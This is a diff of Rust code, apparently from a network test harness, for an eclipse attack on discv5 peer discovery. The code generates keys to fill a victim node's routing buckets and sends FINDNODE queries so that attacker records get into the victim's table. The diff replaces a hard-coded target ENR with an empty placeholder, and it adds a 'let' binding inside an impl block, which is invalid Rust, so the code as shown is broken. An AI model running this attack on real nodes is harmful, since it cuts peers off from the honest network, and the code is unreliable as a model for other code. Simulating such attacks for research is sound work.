@@ -42,6 +42,9 @@ struct InstanceInfo {
 pub(super) struct MonopolizingByIncomingNodes {}
 
 impl MonopolizingByIncomingNodes {
+
+    let victim_enr_base64 = "";
+
     pub(super) fn new() -> Self {
         MonopolizingByIncomingNodes {}
     }
@@ -60,10 +63,9 @@ impl MonopolizingByIncomingNodes {
         // Construct a local Enr
         // ////////////////////////
         // let enr_key = Self::generate_deterministic_keypair(client.group_seq(), &role);
-        let tikuna_base64 = "enr:-MK4QNbpmIy7f3dIZQIRWyWHHONEY5qhqOCUbhSrAfgURTcKV2mtZNFoj4bX6JbYaqLQhw9uAB4axKo-xkJCyeyXJY-GAYXfmOq0h2F0dG5ldHOIAAAAAAAAAACEZXRoMpBKJsWLAgAAAP__________gmlkgnY0gmlwhKfrAeaJc2VjcDI1NmsxoQPDmK65Af8fgK9p28PW2TmVq5G17WDeRPVuH23ZhaX9WIhzeW5jbmV0cwCDdGNwgjLIg3VkcIIu4A";
-        let tikuna_enr: Enr = tikuna_base64.parse().unwrap();
+        let victim_enr: Enr = Self::victim_enr_base64.parse().unwrap();
         client.record_message("Generating keys!!");
-        let mut eclipse_keypairs: Vec<CombinedKey> = Self::generate_single_key_fill_buckets(&tikuna_enr, client.group_seq() % 13).await;
+        let mut eclipse_keypairs: Vec<CombinedKey> = Self::generate_single_key_fill_buckets(&victim_enr, client.group_seq() % 13).await;
 	client.record_message(format!("Generated keys lenght: {}", eclipse_keypairs.len()));
         let enr_key = eclipse_keypairs.remove(0);
         let enr = EnrBuilder::new("v4")
@@ -193,13 +195,12 @@ impl MonopolizingByIncomingNodes {
         // the FINDNODE query will be sent to the victim, and then, if the victim is vulnerable
         // to the eclipse attack, the attacker's ENR will be added to the victim's routing table
         // because of the handshake.
-        let tikuna_base64 = "enr:-MK4QNbpmIy7f3dIZQIRWyWHHONEY5qhqOCUbhSrAfgURTcKV2mtZNFoj4bX6JbYaqLQhw9uAB4axKo-xkJCyeyXJY-GAYXfmOq0h2F0dG5ldHOIAAAAAAAAAACEZXRoMpBKJsWLAgAAAP__________gmlkgnY0gmlwhKfrAeaJc2VjcDI1NmsxoQPDmK65Af8fgK9p28PW2TmVq5G17WDeRPVuH23ZhaX9WIhzeW5jbmV0cwCDdGNwgjLIg3VkcIIu4A";
-        let tikuna_enr: Enr = tikuna_base64.parse().unwrap();
+        let victim_enr: Enr = Self::victim_enr_base64.parse().unwrap();
         let current_ip_address = client.run_parameters().data_network_ip()?.expect("IP address for the data network");
         client.record_message(format!("Current IP address: {:?}", current_ip_address));
         client.record_message("Attacking!!");
         // ping(&client).await;
-        discv5.add_enr(tikuna_enr.clone())?;
+        discv5.add_enr(victim_enr.clone())?;
         if let Err(e) = discv5.find_node(NodeId::random()).await {
             client.record_message(format!("Failed to run query: {}", e));
         }
